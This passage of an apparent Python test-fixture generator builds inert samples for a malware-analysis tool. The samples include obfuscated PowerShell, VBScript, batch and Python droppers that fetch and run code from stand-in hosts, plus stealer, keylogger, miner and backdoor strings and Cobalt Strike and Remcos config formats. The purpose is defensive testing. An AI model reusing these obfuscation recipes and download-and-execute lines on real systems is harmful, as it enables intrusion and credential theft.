    -replace with [char]39 → "iex" from $PSHome chars + octal codes split on '~'
    → "iex" from $env:ComSpec[4,15,25] + reversed string. The core is an invoice
    downloader towards *.example / RFC 5737 addresses."""
    def lit(v: str) -> str:
        return "'" + v.replace("'", "''") + "'"

    payload = ("$u = 'http://billing.invoice-portal.example/Factura_2024-0613.pdf.ps1'\n"
               "$c = New-Object Net.WebClient\n"
               "$c.Headers.Add('X-Invoice', '2024-0613')\n"
               "try { iex ($c.DownloadString($u)) } catch { iex ($c.DownloadString('http://203.0.113.17/inv.ps1')) }")
    l1 = f"& ($env:ComSpec[4,15,25]-join'') ( -join ({lit(payload[::-1])}[-1..-{len(payload)}]) )"
    octal = "~".join(format(ord(ch), "o") for ch in l1)
    l2 = (f".( $PSHome[4]+$PSHome[30]+'x') ( ( '{octal}'.Split('~') | ForEach-Object "
          "{ [char]([convert]::ToInt16($_,8)) }) -join '' )")
    l3 = f"&(gcm *ke-e*) ( ('{l2.replace(chr(39), 'Qz7')}' -replace 'Qz7',[char]39) )"
    l4 = (f"Set-Alias -Name pdfv -Value Invoke-Expression; "
          f"pdfv (-join [regex]::Matches({lit(l3[::-1])},'.','RightToLeft'))")
    return ("# Factura 2024-0613 - visor\n" + l4 + "\n").encode("utf-8")


def xor_loader_vbs() -> bytes:
    """VBScript loader (inert) with the classic decryptor loop: the stage is hex
    text XOR'ed with a string key, rebuilt in a For loop and run with Execute.
    The stage itself hides strings behind Chr(x Xor y), Replace and StrReverse,
    then downloads the "invoice" with MSXML2.XMLHTTP and starts PowerShell."""
    key = "Factura0613"
    stage = (
        'Set h = CreateObject(Replace("MSXQQML2.XMLHQQTTP", "QQ", ""))\r\n'
        'h.Open "GET", "http://invoice-cdn.example/" & StrReverse("fdp.3160-4202_arutcaF"), False\r\n'
        'h.Send\r\n'
        'Set sh = CreateObject("WScript." & Chr(83 Xor 0) & Chr(&H68) & "ell")\r\n'
        'sh.Run "powershell -w hidden -c iwr http://198.51.100.23/inv.ps1 | iex", 0, False'
    )
    enc = "".join(f"{ord(c) ^ ord(key[i % len(key)]):02x}" for i, c in enumerate(stage))
    chunks = [enc[i:i + 96] for i in range(0, len(enc), 96)]
    body = 'd = "' + chunks[0] + '"\r\n' + "".join(f'd = d & "{c}"\r\n' for c in chunks[1:])
    return ("' Factura 2024-0613 - visor de facturas\r\n"
            "Option Explicit\r\nDim d, k, i, s\r\n"
            f'k = "{key}"\r\n' + body +
            "s = \"\"\r\n"
            "For i = 1 To Len(d) Step 2\r\n"
            '  s = s & Chr(CLng("&H" & Mid(d, i, 2)) Xor Asc(Mid(k, ((i \\ 2) Mod Len(k)) + 1, 1)))\r\n'
            "Next\r\n"
            "Execute s\r\n").encode("utf-8")


def dosfuscation_bat() -> bytes:
    """Batch launcher with DOSfuscation tricks (inert): "powershell" rebuilt by a
    FOR-loop index list over a scrambled char set, the download URL reversed with
    for /L, "cmd" sliced out of %COMSPEC% / %PUBLIC%, caret noise and an inline
    set chain under cmd /V:ON /C. The final PowerShell fetches the "invoice"."""
    comspec = "C:\\WINDOWS\\system32\\cmd.exe"
    charset = "lrhweops"
    word = "powershell"
    idx = ",".join(str(charset.index(c)) for c in word)
    url = "http://invoice-files.example/Factura_2024-0613.ps1"
    rev = url[::-1]
    cmd = "".join(f"%COMSPEC:~{comspec.index(c) - len(comspec)},1%" for c in "cmd")
    return ("@echo off\r\n"
            ":: Factura 2024-0613 - descarga del visor\r\n"
            "setlocal EnableDelayedExpansion\r\n"
            f"set c={charset}\r\n"
            f"for %%i in ({idx}) do set p=!p!!c:~%%i,1!\r\n"
            f"set u={rev}\r\n"
            f"for /L %%i in ({len(rev) - 1},-1,0) do set \"w=!w!!u:~%%i,1!\"\r\n"
            f"{cmd} /V:ON /C \"set k=-w h^i^d^den -c&&set q=i\"\"w\"\"r&&call !p! !k! !q! !w! ^| iex\"\r\n"
            "rem fallback 192.0.2.44\r\n").encode("utf-8")


def exec_chain_py() -> bytes:
    """Python dropper (inert) hidden in the "exec chain" public obfuscators use:
    zlib+base64 layers, a reversed-base64 lambda layer and an lzma+base85 layer.
    The core downloads the "invoice" with urllib and runs it."""
    import base64
    import lzma
    import zlib

    core = ("# Factura 2024-0613 - sincronizador\n"
            "import os, subprocess, tempfile, urllib.request\n"
            "u = 'http://invoice-sync.example/Factura_2024-0613.exe'\n"
            "p = os.path.join(tempfile.gettempdir(), 'Factura_2024-0613.exe')\n"
            "try:\n"
            "    urllib.request.urlretrieve(u, p)\n"
            "except Exception:\n"
            "    urllib.request.urlretrieve('http://203.0.113.50/f.exe', p)\n"
            "subprocess.Popen([p], creationflags=0x08000000)\n")
    s = core
    for _ in range(3):
        s = f"import zlib, base64\nexec(zlib.decompress(base64.b64decode({base64.b64encode(zlib.compress(s.encode()))!r})))\n"
    blob = base64.b64encode(zlib.compress(s.encode()))[::-1]
    s = ("_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
         f"exec((_)({blob!r}))\n")
    b85 = base64.b85encode(lzma.compress(s.encode())).decode()
    return ("# -*- coding: utf-8 -*-\nimport lzma as _l, base64 as _b\n"
            f"_d = {b85!r}\n"
            "exec(_l.decompress(_b.b85decode(_d)).decode())\n").encode("utf-8")


def lief_helper_dll() -> bytes:
    """A minimal but valid PE32+ DLL built to exercise the LIEF analysis (inert:
    its only code is ``ret``). It carries what an analyst pivots on:
    a CodeView **PDB path** with the build user/project, a **forwarded export**
    (proxy-DLL pattern: ``GetFileVersionInfoW`` → ``version.dll``), a manifest
    with **requireAdministrator + autoElevate**, a wrong **header checksum** and
    a high-entropy **overlay** (an appended encrypted blob)."""
    import random

    FA, SA = 0x200, 0x1000

    def al(n: int, a: int) -> int:
        return (n + a - 1) & ~(a - 1)

    text_va, rdata_va, rsrc_va = 0x1000, 0x2000, 0x3000
    text = b"\xc3"                                            # ret
    # --- .rdata: export directory (with a forwarder) + debug directory + RSDS ---
    rd = bytearray()

    def put(blob: bytes, align: int = 4) -> int:
        while len(rd) % align:
            rd.append(0)
        off = len(rd)
        rd.extend(blob)
        return rdata_va + off

    exp_dir_off = len(rd)
    rd.extend(b"\x00" * 40)
    dll_name = put(b"invoice_helper.dll\x00", 1)
    fwd = put(b"version.GetFileVersionInfoW\x00", 1)
    n1 = put(b"GetFileVersionInfoW\x00", 1)
    n2 = put(b"SyncInvoices\x00", 1)
    funcs = put(struct.pack("<II", fwd, text_va))
    names = put(struct.pack("<II", n1, n2))
    ords = put(struct.pack("<HH", 0, 1))
    exp_size = len(rd) - exp_dir_off
    rd[exp_dir_off:exp_dir_off + 40] = struct.pack("<IIHHIIIIIII", 0, 0, 0, 0, dll_name, 1, 2, 2,
                                                    funcs, names, ords)
    pdb = rb"C:\Users\jmartin\source\repos\InvoiceSync\x64\Release\invoice_helper.pdb" + b"\x00"
    guid = bytes(range(0x10, 0x20))
    rsds = b"RSDS" + guid + struct.pack("<I", 3) + pdb
    dbg_off = len(rd) + (-len(rd) % 4)
    dbg_rva = put(b"\x00" * 28)
    rsds_rva = put(rsds)
    # --- .rsrc: RT_MANIFEST(24) / 1 / 1033 ---
    manifest = (b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
                b'<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">'
                b'<assemblyIdentity name="InvoiceSync.Helper" version="1.0.0.0" type="win32"/>'
                b'<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges>'
                b'<requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>'
                b'</requestedPrivileges></security></trustInfo>'
                b'<application xmlns="urn:schemas-microsoft-com:asm.v3"><windowsSettings>'
                b'<autoElevate xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</autoElevate>'
                b'</windowsSettings></application></assembly>')

    def dirhdr(n_ids: int) -> bytes:
        return struct.pack("<IIHHHH", 0, 0, 0, 0, 0, n_ids)

    rs = bytearray()
    rs += dirhdr(1) + struct.pack("<II", 24, 0x80000000 | 0x18)          # type → name dir @0x18
    rs += dirhdr(1) + struct.pack("<II", 1, 0x80000000 | 0x30)           # name → lang dir @0x30
    rs += dirhdr(1) + struct.pack("<II", 1033, 0x48)                     # lang → data entry @0x48
    rs += struct.pack("<IIII", rsrc_va + 0x58, len(manifest), 65001, 0)  # data entry
    rs += manifest
    # --- headers ---
    secdata = [(".text", text_va, text, 0x60000020),
               (".rdata", rdata_va, bytes(rd), 0x40000040),
               (".rsrc", rsrc_va, bytes(rs), 0x40000040)]
    nsec = len(secdata)
    e_lfanew, opt_size = 0x80, 240
    size_headers = al(e_lfanew + 4 + 20 + opt_size + nsec * 40, FA)
    secs, rawptr = [], size_headers
    for name, va, data, ch in secdata:
        raw = al(len(data), FA)
        secs.append((name, va, len(data), rawptr, raw, data, ch))
        rawptr += raw
    size_image = al(rsrc_va + len(rs), SA)
    # patch the debug directory (needs the RSDS file offset)
    rd_file = secs[1][3]
    dbg = struct.pack("<IIHHIIII", 0, 0, 0, 0, 2, len(rsds), rsds_rva, rd_file + (rsds_rva - rdata_va))
    rd[dbg_off:dbg_off + 28] = dbg
    secs[1] = secs[1][:5] + (bytes(rd),) + secs[1][6:]
    dos = b"MZ" + b"\x00" * 0x3a + struct.pack("<I", e_lfanew) + b"\x00" * (e_lfanew - 0x40)
    coff = struct.pack("<HHIIIHH", 0x8664, nsec, 0x66A1B2C3, 0, 0, opt_size, 0x2022)   # DLL
    opt = struct.pack("<HBBIIIII", 0x20b, 14, 38, FA, al(len(rd), FA) + al(len(rs), FA), 0, text_va, text_va)
    opt += struct.pack("<Q", 0x180000000)
    opt += struct.pack("<IIHHHHHHIIIIHH", SA, FA, 6, 0, 0, 0, 6, 0, 0, size_image, size_headers,
                       0x00012345, 2, 0x0160)   # wrong checksum; ASLR+DEP+high-entropy VA
    opt += struct.pack("<QQQQ", 0x100000, 0x1000, 0x100000, 0x1000)
    dirs = [(0, 0)] * 16
    dirs[0] = (rdata_va + exp_dir_off, exp_size)
    dirs[2] = (rsrc_va, len(rs))
    dirs[6] = (dbg_rva, 28)
    opt += struct.pack("<II", 0, 16) + b"".join(struct.pack("<II", *d) for d in dirs)
    opt = opt[:opt_size].ljust(opt_size, b"\x00")
    sectbl = b""
    for name, va, vsize, rawp, raw, data, ch in secs:
        sectbl += name.encode().ljust(8, b"\x00") + struct.pack("<IIII", vsize, va, raw, rawp)
        sectbl += struct.pack("<IIHHI", 0, 0, 0, 0, ch)
    body = (dos + b"PE\x00\x00" + coff + opt + sectbl).ljust(size_headers, b"\x00")
    for name, va, vsize, rawp, raw, data, ch in secs:
        body = body.ljust(rawp, b"\x00") + data.ljust(raw, b"\x00")
    rnd = random.Random(20240613)
    return body + bytes(rnd.randrange(256) for _ in range(8192))   # encrypted-looking overlay


def bloated_exe() -> bytes:
    """Binary padding (T1027.001), inert: the LIEF helper DLL inflated to ~24 MB
    with a zero-filled overlay so size-limited scanners skip it. debloat strips
    the junk and the real binary is analysed as a nested child."""
    return lief_helper_dll() + b"\x00" * (24 * 1024 * 1024)


def bloated_section_exe() -> bytes:
    """Binary padding inside a section (no overlay), inert: a binkit stub whose
    .data section is 6 MB of zeros. debloat has to check every section's
    compression ratio to find it (the path that logs with print()-style keywords)."""
    import binkit as bk
    return bk.pe(bits=32, gui=False, imports={"kernel32.dll": ["ExitProcess"]},
                 strings=["invoice sync agent"], sections=[(".data", b"\x00" * (6 * 1024 * 1024), 0xC0000040)])


def invoice_viewer_apk() -> bytes:
    """Inert Android package (Machine Learning tab, APK model): a ZIP with a
    stub AndroidManifest.xml, a stub classes.dex and resources that carry the
    invoice story (*.example URL, SMS-stealer style strings). Not installable."""
    import io
    import zipfile

    manifest = (b"\x03\x00\x08\x00" + b"\x00" * 28
                + "com.example.facturaviewer android.permission.RECEIVE_SMS "
                  "android.permission.READ_SMS android.permission.INTERNET".encode("utf-16-le"))
    dex = (b"dex\n035\x00" + b"\x00" * 104
           + b"Lcom/example/facturaviewer/SmsReceiver;\x00onReceive\x00getMessageBody\x00"
           + b"https://invoice-viewer.example/api/upload\x00Factura_2024-0613\x00")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("AndroidManifest.xml", manifest)
        z.writestr("classes.dex", dex)
        z.writestr("res/values/strings.xml",
                   '<resources><string name="app_name">Factura 2024-0613</string></resources>')
        z.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\r\n")
    return buf.getvalue()


# --- Machine Learning tab: three or more samples per EMBER2024 model ----------------
# All inert (the only code is ``ret``); imports / strings / sections / metadata
# give the static classifiers something to read. Each type has "malicious-looking"
# samples of the invoice story and a clean control.

def ml_samples() -> dict[str, bytes]:
    import binkit as bk

    k32 = ["GetModuleHandleW", "GetProcAddress", "LoadLibraryA", "ExitProcess", "GetLastError",
           "CloseHandle", "Sleep", "GetTempPathW", "CreateFileW", "WriteFile"]
    out: dict[str, bytes] = {}
    # ---- Win32 (PE32) ----
    out["ml/sample_win32_downloader.exe"] = bk.pe(
        bits=32, gui=False, timestamp=0x2A425E19,
        imports={"kernel32.dll": k32 + ["WinExec", "CreateProcessA", "VirtualAlloc"],
                 "urlmon.dll": ["URLDownloadToFileA"], "shell32.dll": ["ShellExecuteA"],
                 "wininet.dll": ["InternetOpenA", "InternetOpenUrlA", "InternetReadFile"]},
        strings=[PAYLOAD_URL, f"http://{C2_IP}/gate.php", "%TEMP%\\upd.exe", "cmd.exe /c start %s",
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "InvoiceUpdate", f"Factura_{INVOICE}.pdf.exe",
                 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"],
        sections=[(".data", bk.noise(0x1800, 101), 0xC0000040)])
    out["ml/sample_win32_injector.exe"] = bk.pe(
        bits=32, gui=True, timestamp=0,
        imports={"kernel32.dll": k32 + ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
                                         "CreateRemoteThread", "CreateToolhelp32Snapshot", "Process32FirstW",
                                         "Process32NextW", "VirtualProtectEx", "ResumeThread", "SetThreadContext"],
                 "advapi32.dll": ["OpenProcessToken", "AdjustTokenPrivileges", "LookupPrivilegeValueA"]},
        strings=["explorer.exe", "SeDebugPrivilege", "svchost.exe -k netsvcs", "InvoiceSync"],
        sections=[(".crt1", bk.noise(0x4000, 102), 0xE0000060)], text_name=".text", text_flags=0xE0000020)
    out["ml/sample_win32_invoice_calc.dll"] = bk.pe(        # clean control
        bits=32, dll=True,
        imports={"kernel32.dll": ["GetModuleHandleW", "ExitProcess", "GetCommandLineW", "HeapAlloc", "HeapFree",
                                   "GetProcessHeap", "MultiByteToWideChar", "GetLocalTime"],
                 "user32.dll": ["MessageBoxW", "CreateWindowExW", "DefWindowProcW", "RegisterClassExW",
                                "GetMessageW", "DispatchMessageW", "TranslateMessage", "PostQuitMessage",
                                "SetWindowTextW", "GetDlgItemTextW"],
                 "gdi32.dll": ["GetStockObject"], "comctl32.dll": ["InitCommonControlsEx"]},
        wstrings=["Calculadora de facturas", "Base imponible", "IVA (21%)", "Total", "Acerca de…",
                  f"{SUPPLIER} — herramienta interna"],
        strings=["InvoiceCalc 1.4.2", "Copyright (C) 2024"],
        pdb=r"D:\build\InvoiceCalc\Release\InvoiceCalc.pdb", rich=True, reloc=True, checksum=True, manifest=True,
        version={"CompanyName": SUPPLIER, "FileDescription": "Calculadora de facturas", "FileVersion": "1.4.2.0",
                 "InternalName": "InvoiceCalc", "OriginalFilename": "InvoiceCalc.dll", "ProductName": "InvoiceCalc",
                 "ProductVersion": "1.4.2.0", "LegalCopyright": f"© 2024 {SUPPLIER}"})
    # ---- Win64 (PE32+) ----
    out["ml/sample_win64_keylogger.exe"] = bk.pe(
        bits=64, gui=True, timestamp=0x5C2A1F00,
        imports={"kernel32.dll": k32 + ["CreateMutexA", "GetComputerNameA"],
                 "user32.dll": ["SetWindowsHookExW", "CallNextHookEx", "GetAsyncKeyState", "GetKeyState",
                                "GetForegroundWindow", "GetWindowTextW", "MapVirtualKeyW", "GetKeyboardLayout",
                                "OpenClipboard", "GetClipboardData"],
                 "wininet.dll": ["InternetOpenW", "InternetConnectW", "HttpOpenRequestW", "HttpSendRequestW"],
                 "advapi32.dll": ["RegSetValueExW", "RegCreateKeyExW"]},
        strings=[f"http://{C2_IP}/k.php", "[ENTER]", "[BACKSPACE]", "[TAB]", "[CTRL]", "keys.log",
                 "Global\\InvoiceKbdMtx"],
        wstrings=["Software\\Microsoft\\Windows\\CurrentVersion\\Run", "InvoiceHelper", "%APPDATA%\\inv\\keys.log"])
    out["ml/sample_win64_packed_loader.exe"] = bk.pe(
        bits=64, gui=True, timestamp=0,
        imports={"kernel32.dll": ["LoadLibraryA", "GetProcAddress", "VirtualProtect", "VirtualAlloc",
                                   "ExitProcess"]},
        sections=[("UPX1", bk.noise(0xA000, 103), 0xE0000060), (".rsrc", bk.noise(0x800, 104), 0xC0000040)],
        text_name="UPX0", text_flags=0xE0000080)
    out["ml/sample_win64_invoice_sync.dll"] = bk.pe(          # clean control
        bits=64, dll=True,
        imports={"kernel32.dll": ["GetModuleHandleW", "DisableThreadLibraryCalls", "InitializeCriticalSection",
                                   "EnterCriticalSection", "LeaveCriticalSection", "GetSystemTimeAsFileTime"],
                 "msvcrt.dll": ["malloc", "free", "memcpy", "_wcsicmp"],
                 "advapi32.dll": ["RegOpenKeyExW", "RegQueryValueExW", "RegCloseKey"]},
        exports=["InvoiceSyncInit", "InvoiceSyncRun", "InvoiceSyncShutdown", "InvoiceSyncVersion"],
        strings=["InvoiceSync 3.2.0", "invoices.db", "SELECT * FROM facturas WHERE estado = ?"],
        pdb=r"D:\build\InvoiceSync\x64\Release\invoicesync.pdb", rich=True, reloc=True, checksum=True,
        manifest=True, version={"CompanyName": SUPPLIER, "FileDescription": "Invoice synchronisation library",
                                "FileVersion": "3.2.0.0", "InternalName": "invoicesync",
                                "OriginalFilename": "invoicesync.dll", "ProductName": "InvoiceSync",
                                "ProductVersion": "3.2.0.0", "LegalCopyright": f"© 2024 {SUPPLIER}"})
    # ---- .NET ----
    out["ml/sample_dotnet_stealer.exe"] = bk.pe(
        bits=32, gui=True, dotnet={
            "assembly": "FacturaViewer.Stealer",
            "strings": ["System.Net.Http", "HttpClient", "PostAsync", "Convert", "FromBase64String",
                        "ProtectedData", "Unprotect", "GetPasswords", "GetCookies", "SendToTelegram",
                        "Screenshot", "CopyFromScreen", "Registry", "SetValue", "Environment", "GetFolderPath"],
            "user_strings": ["\\Google\\Chrome\\User Data\\Default\\Login Data", "\\Mozilla\\Firefox\\Profiles",
                             "SELECT origin_url, username_value, password_value FROM logins",
                             "https://api.telegram-relay.example/bot/sendDocument", f"http://{C2_IP}/upload",
                             "Software\\Microsoft\\Windows\\CurrentVersion\\Run", f"Factura_{INVOICE}"]})
    out["ml/sample_dotnet_loader.exe"] = bk.pe(
        bits=32, gui=False, dotnet={
            "assembly": "InvoiceLoader",
            "strings": ["System.Reflection", "Assembly", "Load", "GetType", "InvokeMember", "Convert",
                        "FromBase64String", "Aes", "CreateDecryptor", "GZipStream", "VirtualAlloc",
                        "DllImportAttribute", "kernel32.dll"],
            "user_strings": ["payload", "Invoice.Stage2.Program", "Run", f"http://{C2_IP}/s2.bin"],
            "resource": bk.noise(0x6000, 105)})
    out["ml/sample_dotnet_invoice_tool.dll"] = bk.pe(        # clean control
        bits=32, dll=True, dotnet={
            "assembly": "Suministros.InvoiceTool",
            "strings": ["System.Windows.Forms", "Form", "Button", "Label", "DataGridView", "Decimal",
                        "Round", "CultureInfo", "ToString", "InitializeComponent", "CalculateTotal"],
            "user_strings": ["Factura", "Base imponible", "IVA", "Total", "es-ES", "{0:N2} €"]},
        pdb=r"D:\src\Suministros.InvoiceTool\obj\Release\Suministros.InvoiceTool.pdb", reloc=True,
        checksum=True, manifest=True,
        version={"CompanyName": SUPPLIER, "FileDescription": "Suministros.InvoiceTool", "FileVersion": "2.1.0.0",
                 "InternalName": "Suministros.InvoiceTool.dll", "OriginalFilename": "Suministros.InvoiceTool.dll",
                 "ProductName": "Suministros.InvoiceTool", "ProductVersion": "2.1.0.0",
                 "Assembly Version": "2.1.0.0", "LegalCopyright": f"© 2024 {SUPPLIER}"})
    # ---- PDF ----
    out["ml/sample_pdf_openaction_js.pdf"] = pk.lure_pdf(
        [SUPPLIER, f"Factura {INVOICE}", "Cargando documento seguro…"],
        open_js=PDF_JS, title=f"Factura {INVOICE}", author="Administracion")[0]
    out["ml/sample_pdf_launch_embedded.pdf"] = pk.lure_pdf(
        [SUPPLIER, f"Factura {INVOICE} — Importe {AMOUNT} EUR", "Pulse «Abrir» para ver el detalle."],
        launch=("cmd.exe", "/c start factura.exe"), embedded=("factura.exe", MZ_STUB),
        title=f"Factura {INVOICE}", author="Administracion")[0]
    out["ml/sample_pdf_invoice_clean.pdf"] = pk.lure_pdf(          # clean control
        [SUPPLIER, f"Factura {INVOICE}", "", "Concepto: material de oficina", "Base imponible: 1.033,06 EUR",
         "IVA 21%: 216,94 EUR", f"Total: {AMOUNT} EUR", "", "Forma de pago: transferencia a 30 días."],
        title=f"Factura {INVOICE}", author="Suministros Iberia")[0]
    # ---- ELF ----
    out["ml/sample_elf_miner"] = bk.elf(
        strings=["stratum+tcp://pool.invoice-mining.example:3333", "--donate-level=0", "--max-cpu-usage=95",
                 "randomx", "\"algo\": \"rx/0\"", "/tmp/.X11-unix/.inv", "crontab -l | { cat; echo \"*/5 * * * * "
                 "/tmp/.X11-unix/.inv\"; } | crontab -", "pkill -9 kdevtmpfsi", "/proc/cpuinfo", "hugepages"],
        needed=["libpthread.so.0", "libc.so.6"], interp="/lib64/ld-linux-x86-64.so.2",
        extra=[(".data", bk.noise(0x3000, 106))])
    out["ml/sample_elf_backdoor"] = bk.elf(
        strings=["/bin/sh", "-i", f"{C2_IP}", "4444", "dup2", "execve", "setsid", "/etc/rc.local",
                 "/root/.ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2E invoice@ops", "HISTFILE=/dev/null",
                 "chattr +i", "iptables -F", "/proc/self/exe", "socket", "connect", "kill -9",
                 f"wget http://{C2_IP}/x -O /tmp/.x", "chmod +x /tmp/.x", "nohup"],
        needed=["libc.so.6"], interp="/lib64/ld-linux-x86-64.so.2",
        extra=[(".data", bk.noise(0x2000, 107))])                 # encrypted config blob
    out["ml/sample_elf_invoice_sync"] = bk.elf(                   # clean control
        strings=["Usage: invoice-sync [--config FILE] [--dry-run]", "invoice-sync 2.4.1",
                 "/etc/invoice-sync/config.yaml", "Synchronising %d invoices", "done in %.2fs",
                 "sqlite3_open", "sqlite3_prepare_v2", "SELECT id, total FROM facturas", "--help", "--version"],
        needed=["libsqlite3.so.0", "libc.so.6"], interp="/lib64/ld-linux-x86-64.so.2")
    # ---- APK (plus ml/sample_invoice_viewer.apk) ----
    out["ml/sample_apk_overlay_banker.apk"] = bk.apk(
        package="com.example.facturapago",
        permissions=["android.permission.BIND_ACCESSIBILITY_SERVICE", "android.permission.SYSTEM_ALERT_WINDOW",
                     "android.permission.RECEIVE_SMS", "android.permission.READ_SMS", "android.permission.SEND_SMS",
                     "android.permission.REQUEST_INSTALL_PACKAGES", "android.permission.INTERNET",
                     "android.permission.QUERY_ALL_PACKAGES", "android.permission.READ_CONTACTS",
                     "android.permission.RECEIVE_BOOT_COMPLETED", "android.permission.FOREGROUND_SERVICE"],
        dex_strings=["Lcom/example/facturapago/OverlayService;", "Landroid/accessibilityservice/AccessibilityService;",
                     "onAccessibilityEvent", "performGlobalAction", "TYPE_APPLICATION_OVERLAY",
                     "com.bank.example.app", "https://panel.facturapago.example/inj/", "getInstalledPackages",
                     "Ldalvik/system/DexClassLoader;", "loadClass", "Landroid/telephony/SmsManager;",
                     "sendTextMessage", "Ljavax/crypto/Cipher;", "AES/ECB/PKCS5Padding", "DevicePolicyManager",
                     "lockNow", "setComponentEnabledSetting", "getDeviceId", "Base64", "decode", "Runtime",
                     "exec", "su", "/system/xbin/su", "getLaunchIntentForPackage"],
        app_name="Pago de factura",
        extra={"assets/payload.dat": bk.noise(0x4000, 119)}, store=True)   # encrypted 2nd-stage DEX (stand-in)
    out["ml/sample_apk_invoice_scanner.apk"] = bk.apk(           # clean control
        package="com.example.invoicescanner",
        permissions=["android.permission.CAMERA", "android.permission.INTERNET"],
        dex_strings=["Lcom/example/invoicescanner/MainActivity;", "Landroidx/appcompat/app/AppCompatActivity;",
                     "onCreate", "setContentView", "CameraX", "TextRecognizer", "Factura detectada",
                     "https://api.suministros-iberia.example.com/v1/invoices"],
        app_name="Escáner de facturas")
    return out


def native_libs_apk() -> bytes:
    """Inert Android package with the same native library for two ABIs
    (lib/arm64-v8a/libapp.so, lib/x86_64/libapp.so): ELF shared objects whose
    DT_NEEDED libraries (liblog.so, libc.so…) must not become "domains" (.so is
    also a ccTLD), with an "::" string that is not an IPv6. Exercises the ELF
    tab label, the per-ABI tab names and the IOC filters."""
    import binkit as bk

    def lib(machine: int) -> bytes:
        return bk.elf(shared=True, soname="libapp.so", machine=machine,
                      needed=["liblog.so", "libandroid.so", "libm.so", "libdl.so", "libc.so"],
                      strings=["::", "Java_com_example_facturalector_Native_sync",
                               "https://api.facturas-lector.example/v1/sync", f"Factura {INVOICE}",
                               "std::vector", "1.2.3"])
    return bk.apk(package="com.example.facturalector",
                  permissions=["android.permission.INTERNET"],
                  dex_strings=["Lcom/example/facturalector/Native;", "System", "loadLibrary", "app"],
                  app_name="Lector de facturas",
                  extra={"lib/arm64-v8a/libapp.so": lib(0xB7), "lib/x86_64/libapp.so": lib(0x3E)})


def marker_drop_js() -> bytes:
    """A JScript dropper that writes a 1-byte lock / marker file and a real
    PowerShell stage: only the stage becomes a nested child (tiny non-code
    drops are not stages)."""
    return (
        "// Factura " + INVOICE + " - visor\r\n"
        "var fso = new ActiveXObject('Scripting.FileSystemObject');\r\n"
        "var lock = fso.CreateTextFile('C:\\\\Users\\\\Public\\\\inv.lock', true);\r\n"
        "lock.Write('1'); lock.Close();\r\n"
        "var st = fso.CreateTextFile('C:\\\\Users\\\\Public\\\\upd.ps1', true);\r\n"
        "st.Write(\"IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/inv/upd.ps1')\");\r\n"
        "st.Close();\r\n"
        "new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -f C:\\\\Users\\\\Public\\\\upd.ps1', 0);\r\n"
    ).encode()


# --- C2 / Beacons tab: implant configurations ----------------------------------------
# Inert: the beacon and stager are config blocks / code fragments inside an "MZ" +
# text stub (nothing that runs), the RATs are binkit stubs whose only code is
# ``ret``. Their configurations use the real formats, so the extractors read them
# exactly as they would a real sample: Cobalt Strike TLV (XOR 0x2e), Metasploit
# reverse_https stager shapes, Remcos RC4 "SETTINGS" resource, AsyncRAT / Quasar
# AES-256 + HMAC settings. C2 values are the campaign's (*.example, RFC 5737).

C2_STUB = b"MZ" + b"This is an inert DocuTraceX sample, not a program.\r\n".ljust(510, b"\x00")


def cs_beacon_blob() -> bytes:
    import struct

    def short(i, v):
        return struct.pack(">HHHH", i, 1, 2, v)

    def num(i, v):
        return struct.pack(">HHHI", i, 2, 4, v)

    def data(i, b, n):
        return struct.pack(">HHH", i, 3, n) + b.ljust(n, b"\x00")
    cfg = (short(1, 8) + short(2, 443) + num(3, 45000) + num(4, 1048576) + short(5, 25)
           + data(7, b"\x30\x81\x9f" + b"\x00" * 159, 256)
           + data(8, b"cdn-update.example.net,/jquery-3.3.1.min.js", 256)
           + data(9, b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) InvoiceSync/2.4", 256)
           + data(10, b"/jquery-3.3.2.min.js", 64) + data(15, b"\\\\.\\pipe\\factura_sync_%x", 128)
           + data(29, b"%windir%\\syswow64\\rundll32.exe", 64)
           + data(30, b"%windir%\\sysnative\\rundll32.exe", 64)
           + num(37, 20260187) + b"\x00\x00")
    return C2_STUB + bytes(c ^ 0x2E for c in cfg.ljust(4096, b"\x00"))


def msf_https_stager_blob() -> bytes:
    """Metasploit reverse_https stager *shapes*, not a stager: the block_api
    prologue, the wininet name, the port pushed before InternetConnectA's hash,
    the URI and the host — separated by text so nothing here can run."""
    frag = b"\n[inert fragments of a reverse_https stager follow]\n"
    return (C2_STUB + frag
            + b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30" + b" -- block_api -- "
            + b"\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69" + b" -- wininet -- "
            + b"\x68\xbb\x01\x00\x00\x68\x57\x89\x9f\xc6" + b" -- port 443, InternetConnectA -- "
            + b"\x00/inv/Fct2026_0187\x00" + b" -- uri, host -- "
            + b"\x00cdn-update.example.net\x00" + frag)


def remcos_exe() -> bytes:
    import binkit as bk

    def rc4(key: bytes, data: bytes) -> bytes:
        st, j, out = list(range(256)), 0, bytearray()
        for i in range(256):
            j = (j + st[i] + key[i % len(key)]) & 0xFF
            st[i], st[j] = st[j], st[i]
        i = j = 0
        for c in data:
            i = (i + 1) & 0xFF
            j = (j + st[i]) & 0xFF
            st[i], st[j] = st[j], st[i]
            out.append(c ^ st[(st[i] + st[j]) & 0xFF])
        return bytes(out)

    sep = b"|\x1e\x1e\x1f|"
    cfg = sep.join([b"cdn-update.example.net:2404:1\x1e" + C2_IP.encode() + b":2404:0", b"Factura-2026",
                    b"1", b"remcos.exe", b"%AppData%", b"Rmc-F4C7A1", b"0", b"5", b"logs.dat"])
    key = b"InvoiceKey2026"
    return bk.pe(bits=32, gui=True, imports={"kernel32.dll": ["FindResourceA", "LoadResource", "Sleep"]},
                 strings=["Remcos v4.9.4 Pro", "Breaking-Security.Net"],
